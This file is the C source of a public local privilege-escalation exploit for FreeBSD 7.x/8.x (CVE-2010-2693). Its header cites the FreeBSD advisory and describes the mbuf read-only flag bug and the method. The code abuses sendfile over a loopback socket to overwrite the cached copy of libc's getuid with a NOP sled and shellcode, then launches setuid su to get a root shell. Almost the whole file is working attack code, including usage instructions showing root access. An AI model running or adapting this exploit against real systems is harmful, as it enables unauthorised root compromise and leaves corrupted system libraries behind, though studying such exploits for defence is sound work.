/*
 * cve-2010-2693.c
 *
 * FreeBSD Kernel 7.x/8.x mbuf M_RDONLY Privilege Escalation
 * Jon Oberheide <jon@oberheide.org>
 * http://jon.oberheide.org
 * 
 * Information:
 *
 *   http://security.freebsd.org/advisories/FreeBSD-SA-10:07.mbuf.asc
 *
 *   The read-only flag is not correctly copied when a mbuf buffer reference
 *   is duplicated.  When the sendfile(2) system call is used to transmit
 *   data over the loopback interface, this can result in the backing pages
 *   for the transmitted file being modified, causing data corruption.
 *
 * Usage:
 *
 *   $ gcc cve-2010-2693.c -o cve-2010-2693 -lpthread
 *   $ ./cve-2010-2693
 *   ...
 *   # id
 *   uid=0(root) ...
 *
 * Notes:
 *
 *   Exploiting the mbuf vulnerability, we corrupt the in-memory copy of libc 
 *   stored in the filesystem buffer cache with some shellcode. In particular,
 *   we overwrite getuid with a sled + mov $0x0,%eax + ret. Then, we spawn the
 *   setuid 'su' to get an instant root shell.
 *
 *   The libc copy in the fs buffer cache will stick around for a while so you
 *   might want to remount/reboot after you're done with your root shell.
 *
 *   Kingcope beat me to this one by a long shot but I might as well still 
 *   release it since it takes a slightly different approach. :-)
 *
 *   Tested on FreeBSD 8.0-RELEASE, but should work on any unpatched 7.x/8.x.
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <pthread.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define SHELLCODE "\xb8\x00\x00\x00\x00\xc3"
#define SHELLCODE_LEN 6

void *
run_listener(void *arg)
{
	char buf[4096];
	int ret, sock, conn;
	struct sockaddr_in addr;

	sock = socket(AF_INET, SOCK_STREAM, 0);
	bzero(&addr, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(2693);
	addr.sin_addr.s_addr = inet_addr("127.0.0.1");

	ret = bind(sock, (struct sockaddr *) &addr, sizeof(addr));
	if (ret < 0) {
		printf("[-] couldn't bind to listener socket\n");
		exit(1);
	}

	ret = listen(sock, 1);
	if (ret < 0) {
		printf("[-] couldn't listen on socket\n");
		exit(1);
	}

	conn = accept(sock, NULL, NULL);
	if (conn < 0) {
		printf("[-] couldn't accept incoming connection\n");
		exit(1);
	}

	while(1) {
		ret = read(conn, &buf, sizeof(buf));
		if (ret < 0) {
			break;
		}
	}

	return NULL;
}

int
main(int argc, char *argv[])
{
	FILE *fp;
	char libc[64];
	int ret, sock, fd, fsize, flags, chunk = 0;
	int getuid, offset, writes;
	off_t bytes, sent = 0;
	struct sockaddr_in addr;
	struct stat statbuf;
	pthread_t listener;
	fd_set wset;

	char sc[256 + SHELLCODE_LEN];
	memset(sc, 0x90, sizeof(sc));
	memcpy(sc + (sizeof(sc) - SHELLCODE_LEN), SHELLCODE, SHELLCODE_LEN);

	printf("[+] checking for setuid /usr/bin/su binary...\n");

	ret = stat("/usr/bin/su", &statbuf);
	if (ret < 0) {
		printf("[-] couldn't find setuid /usr/bin/su binary!\n");
		exit(1);
	}

	printf("[+] checking for suitable libc library in /lib...\n");

	memset(libc, 0x0, sizeof(libc));
	fp = popen("ls -1 /lib/libc.so.*", "r");
	fscanf(fp, "%s", libc);
	fclose(fp);
	
	printf("[+] found libc at %s\n", libc);

	fp = popen("nm -D /lib/libc.so.* | grep \"W getuid\"", "r");
	fscanf(fp, "%x", &getuid);
	fclose(fp);

	printf("[+] found getuid function at 0x%08x\n", getuid);

	offset = getuid - 2048;
	writes = offset / 256;

	printf("[+] target: 0x%08x, adjusted: 0x%08x, writes: %d\n", getuid, offset, writes);

	printf("[+] spawning listener thread...\n");

	if (pthread_create(&listener, NULL, run_listener, NULL) != 0){
		printf("[-] couldn't create listener thread!\n");
		exit(1);
	}
	sleep(3);

	printf("[+] connecting to listener thread...\n");

	sock = socket(AF_INET, SOCK_STREAM, 0);
	bzero(&addr, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(2693);
	addr.sin_addr.s_addr = inet_addr("127.0.0.1");

	ret = connect(sock, (struct sockaddr *) &addr, sizeof(addr));
	if (ret < 0) {
		printf("[-] couldn't connect to listening thread!\n");
		exit(1);
	}

	printf("[+] initiating exploit via sendfile...\n");

	fd = open(libc, O_RDONLY);
	if (fd < 0) {
		printf("[-] couldn't open target libc library!\n");
		exit(1);
	}

	ret = fstat(fd, &statbuf);
	if (ret < 0) {
		printf("[-] couldn't stat target libc library!\n");
		exit(1);
	}

	fsize = statbuf.st_size;
	flags = fcntl(fd, F_GETFL);
	flags |= O_NONBLOCK;
	fcntl(fd, F_SETFL, flags);

	while (fsize > 0) {
		FD_ZERO(&wset);
		FD_SET(sock, &wset);
		ret = select(fd + 1, NULL, &wset, NULL, NULL);
		if (ret < 0) {
			continue;
		}

		if (chunk > 0) {
			bytes = 0;
			ret = sendfile(fd, sock, 256 * writes, chunk, NULL, &bytes, 0);
			if (ret < 0) {
				continue;
			}
			chunk -= bytes;
			fsize -= bytes;
			sent += bytes;
			continue;
		}

		chunk = 2048;
		write(sock, sc, sizeof(sc));
	}

	printf("[+] exploit complete!\n");
	printf("[+] spawning root shell...\n");

	system("su");

	return 0;
}
